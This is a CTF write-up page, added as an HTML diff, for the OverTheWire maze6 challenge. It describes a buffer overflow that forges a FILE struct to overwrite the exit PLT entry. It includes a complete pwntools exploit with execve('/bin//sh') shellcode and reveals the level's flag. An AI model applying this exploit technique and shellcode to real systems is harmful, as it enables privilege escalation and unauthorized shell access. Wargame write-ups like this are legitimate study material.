@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/CTF_writeups/assets/css/style.css?v=6aacf4c090fc5e966ec687925a0bf39a46c3a14c">
+    <link rel="shortcut icon" type="image/x-icon" href="/CTF_writeups/favicon.ico">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>maze6 | Avishai’s CTF Writeups</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="maze6" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="…" />
+<meta property="og:description" content="…" />
+<link rel="canonical" href="http://localhost:4000/CTF_writeups/overthewire/maze/maze6.html" />
+<meta property="og:url" content="http://localhost:4000/CTF_writeups/overthewire/maze/maze6.html" />
+<meta property="og:site_name" content="Avishai’s CTF Writeups" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="maze6" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"…","headline":"maze6","url":"http://localhost:4000/CTF_writeups/overthewire/maze/maze6.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/CTF_writeups/">
+          <h1>Avishai's CTF Writeups</h1>
+        </a>
+        <h2>...</h2>
+
+        <section id="downloads">
+          
+          <a href="https://github.com/avishaigonen123/CTF_writeups" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <p>i decompiled maze 6, here you can see the source code.</p>
+
+<p><img src="/CTF_writeups/overthewire/maze/images/level6_1.png" alt="image" /></p>
+
+<p>in this challenge we use buffer overflow to override the file.
+we make our own File* struct, and put there in the write buffer our address, the address of the exit function in plt, and then we’ll write there the shellcode.</p>
+
+<ul>
+  <li>this is a regular FILE* struct, when we open <code class="language-plaintext highlighter-rouge">file</code> for writing.</li>
+  <li>
+    <p>the words i marked are: <em>_IO_write_base</em>, <em>_IO_write_ptr</em>, <em>_IO_write_end</em>
+<img src="/CTF_writeups/overthewire/maze/images/level6_2.png" alt="image" /></p>
+  </li>
+  <li>
+    <p>we need to find the address of exit in the plt record
+<img src="/CTF_writeups/overthewire/maze/images/level6_3.png" alt="image" />
+<img src="/CTF_writeups/overthewire/maze/images/level6_4.png" alt="image" />
+so, the address of exit function in plt is <code class="language-plaintext highlighter-rouge">0x0804b208</code></p>
+  </li>
+  <li>we need to inject our shellcode and find its address, we need to find the address of our malware FILE* struct.
+<img src="/CTF_writeups/overthewire/maze/images/level6_5.png" alt="image" />
+we can see that the address of shellcode is <code class="language-plaintext highlighter-rouge">0xffffd204</code> and address of our malware FILE* struct <code class="language-plaintext highlighter-rouge">0xffffd158</code></li>
+</ul>
+
+<p>for summary, we need to find this values:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>FILE_struct_address  = 0xffffd158
+plt_exit_address = 0x0804b208
+shellcode_address = 0xffffd204
+</code></pre></div></div>
+<p>the code can be found here [level7.py]</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
+</span><span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c1"># values to modify
+</span><span class="n">FILE_struct_address</span>  <span class="o">=</span> <span class="mh">0xffffd158</span>
+<span class="n">plt_exit_address</span> <span class="o">=</span> <span class="mh">0x0804b208</span>
+<span class="n">shellcode_address</span> <span class="o">=</span> <span class="mh">0xffffd204</span>
+
+<span class="n">write_buffer_address</span> <span class="o">=</span> <span class="n">plt_exit_address</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="s">'file : '</span><span class="p">)</span> <span class="c1"># because we print 'file : shellcode_address', and i want the shellcode address to override plt-exit-address
+</span>
+<span class="n">_IO_write_base</span> <span class="o">=</span> <span class="n">write_buffer_address</span>
+<span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="n">write_buffer_address</span>
+<span class="n">_IO_write_end</span> <span class="o">=</span> <span class="n">write_buffer_address</span><span class="o">+</span><span class="mi">400</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">shellcode_address</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xfbad3484</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00\x00\x00\x00</span><span class="s">'</span> <span class="o">*</span> <span class="mi">3</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">_IO_write_base</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">_IO_write_ptr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">_IO_write_end</span><span class="p">)</span> 
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00\x00\x00\x00</span><span class="s">'</span> <span class="o">*</span> <span class="mi">6</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xf7faeca0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x00000003</span><span class="p">)</span> <span class="o">+</span>  <span class="sa">b</span><span class="s">'</span><span class="se">\x00\x00\x00\x00</span><span class="s">'</span> <span class="o">*</span> <span class="mi">3</span> 
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x0804c238</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xffffffff</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00\x00\x00\x00</span><span class="s">'</span> 
+<span class="n">payload</span><span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x0804c244</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00\x00\x00\x00</span><span class="s">'</span> <span class="o">*</span> <span class="mi">14</span>
+
+<span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span>
+    <span class="sa">b</span><span class="s">"</span><span class="se">\x6a\x31</span><span class="s">"</span>  <span class="c1"># push 0x31 (49)
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x58</span><span class="s">"</span>      <span class="c1"># pop eax
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\xcd\x80</span><span class="s">"</span>  <span class="c1"># int 0x80 (geteuid())
+</span>
+    <span class="sa">b</span><span class="s">"</span><span class="se">\x89\xc3</span><span class="s">"</span>  <span class="c1"># mov ebx, eax (uid)
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x89\xd9</span><span class="s">"</span>  <span class="c1"># mov ecx, ebx
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x6a\x46</span><span class="s">"</span>  <span class="c1"># push 0x46 (70)
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x58</span><span class="s">"</span>      <span class="c1"># pop eax
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\xcd\x80</span><span class="s">"</span>  <span class="c1"># int 0x80, setreuid(geteuid(), geteuid())
+</span>
+    <span class="sa">b</span><span class="s">"</span><span class="se">\x31\xd2</span><span class="s">"</span>  <span class="c1"># xor edx, edx
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x52</span><span class="s">"</span>      <span class="c1"># push edx, which is \0
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x68\x2f\x2f\x73\x68</span><span class="s">"</span>  <span class="c1"># push "//sh"
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x68\x2f\x62\x69\x6e</span><span class="s">"</span>  <span class="c1"># push "/bin"
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x89\xe3</span><span class="s">"</span>  <span class="c1"># mov ebx, esp (now ebx contains: "/bin//sh",\x00)
+</span>
+    <span class="sa">b</span><span class="s">"</span><span class="se">\x52</span><span class="s">"</span>      <span class="c1"># push edx (push NULL into stack)
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x53</span><span class="s">"</span>      <span class="c1"># push ebx (push pathname)
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x89\xe1</span><span class="s">"</span>  <span class="c1"># mov ecx, esp (ecx is argv)
+</span>
+    <span class="sa">b</span><span class="s">"</span><span class="se">\xb0\x0b</span><span class="s">"</span>  <span class="c1"># mov al, 0x0b (11)
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\xcd\x80</span><span class="s">"</span>  <span class="c1"># int 0x80 (execv("/bin//sh", argv))
+</span>
+        <span class="c1"># mv eax, 1         ; system call number (sys_exit)
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x6a\x01</span><span class="s">"</span>  <span class="c1"># push 1
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x58</span><span class="s">"</span>      <span class="c1"># pop eax (sys_exit)
+</span>    <span class="c1"># int 0x80
+</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\xcd\x80</span><span class="s">"</span>  <span class="c1"># int 0x80 (exit())
+</span><span class="p">)</span>
+
+
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x90</span><span class="s">'</span><span class="o">*</span><span class="p">(</span><span class="mi">256</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>  
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">shellcode</span>
+
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">FILE_struct_address</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">byte</span><span class="o">^</span><span class="mh">0x2A</span> <span class="k">for</span> <span class="n">byte</span> <span class="ow">in</span> <span class="n">payload</span><span class="p">])</span> <span class="c1"># reverse memprob
+</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'file'</span> <span class="o">+</span> <span class="sa">b</span><span class="s">' '</span> <span class="o">+</span> <span class="n">payload</span>
+<span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nb">buffer</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+</code></pre></div></div>
+
+<p><img src="/CTF_writeups/overthewire/maze/images/level6_6.png" alt="image" /></p>
+
+<p><strong>Flag:</strong> <strong><em><code class="language-plaintext highlighter-rouge">B6XkM3Syq6</code></em></strong></p>
+
+      </section>
+    </div>
+  </body>
+</html>
